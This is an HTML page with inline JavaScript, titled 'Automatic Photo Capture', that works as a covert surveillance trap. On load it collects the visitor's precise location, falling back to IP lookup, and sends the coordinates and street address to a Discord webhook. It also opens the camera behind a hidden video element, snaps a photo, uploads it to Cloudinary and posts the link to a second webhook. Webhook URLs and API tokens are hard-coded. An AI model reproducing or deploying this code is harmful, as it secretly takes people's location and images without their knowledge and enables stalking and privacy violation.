<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Photo Capture</title>
    <style>
        video, canvas {
            display: none; /* Hide video and canvas */
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
        const photoWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
        const ipinfoToken = '41d360af12f2bf';

        // Cloudinary Configuration
        const cloudName = 'dpokctx0v';  // Your Cloudinary Cloud Name
        const apiKey = '793147654922692';  // Your Cloudinary API Key
        const uploadPreset = 'uth2rbzj';  // Your Cloudinary Upload Preset

        // Function to get the location (geolocation fallback to IP)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                error({ code: 0, message: "Geolocation not supported" });
            }
        }

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            reverseGeocode(latitude, longitude);
        }

        function error(err) {
            sendErrorToDiscord(`Geolocation Error (${err.code}): ${err.message}`);
            getIPGeolocation();
        }

        // Fallback IP geolocation
        function getIPGeolocation() {
            fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.loc) {
                        const [latitude, longitude] = data.loc.split(',');
                        reverseGeocode(latitude, longitude);
                    } else {
                        sendErrorToDiscord("Unable to retrieve location from IP.");
                    }
                })
                .catch(() => sendErrorToDiscord('Error fetching IP geolocation.'));
        }

        // Reverse geocoding to get human-readable address
        function reverseGeocode(latitude, longitude) {
            const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data && data.display_name) {
                        const address = data.display_name;
                        sendLocationToDiscord(latitude, longitude, address);
                    } else {
                        sendErrorToDiscord('Error in reverse geocoding.');
                    }
                })
                .catch(() => sendErrorToDiscord('Error during reverse geocoding.'));
        }

        // Send location information to Discord
        function sendLocationToDiscord(latitude, longitude, address) {
            const message = {
                content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
            };

            fetch(locationWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message),
            });
        }

        // Initialize the camera and capture photo automatically
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('video').addEventListener('loadedmetadata', capturePhoto); // Capture photo automatically
            } catch {
                sendErrorToDiscord("Error accessing the camera.");
            }
        }

        // Capture photo automatically when camera is ready
        async function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);  // Capture the image from the video
            const imageData = canvas.toDataURL('image/png');  // Convert the image to base64 format
            await uploadToCloudinary(imageData);  // Upload the image to Cloudinary
        }

        // Upload the captured image to Cloudinary
        async function uploadToCloudinary(imageData) {
            const byteString = atob(imageData.split(',')[1]);
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uintArray = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }

            const blob = new Blob([uintArray], { type: 'image/png' });
            const formData = new FormData();
            formData.append('file', blob);
            formData.append('upload_preset', uploadPreset);  // Use your Cloudinary Upload Preset
            formData.append('api_key', apiKey);  // Use your Cloudinary API Key

            // Upload to Cloudinary
            const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();

            if (data.secure_url) {
                const imageUrl = data.secure_url;
                await sendImageToDiscord(imageUrl);  // Send the image URL to Discord
            } else {
                sendErrorToDiscord('Failed to upload image to Cloudinary');
            }
        }

        // Send image URL to Discord
        async function sendImageToDiscord(imageUrl) {
            const response = await fetch(photoWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "New Photo Captured",
                    embeds: [{
                        image: { url: imageUrl }
                    }],
                }),
            });

            if (!response.ok) {
                sendErrorToDiscord("Error sending image to Discord.");
            }
        }

        // Send error messages to Discord
        function sendErrorToDiscord(message) {
            fetch(locationWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message }),
            });
        }

        // On page load, start everything
        window.onload = () => {
            getLocation();  // Fetch location automatically
            initCamera();   // Initialize the camera and start capturing
        };
    </script>
</body>
</html>
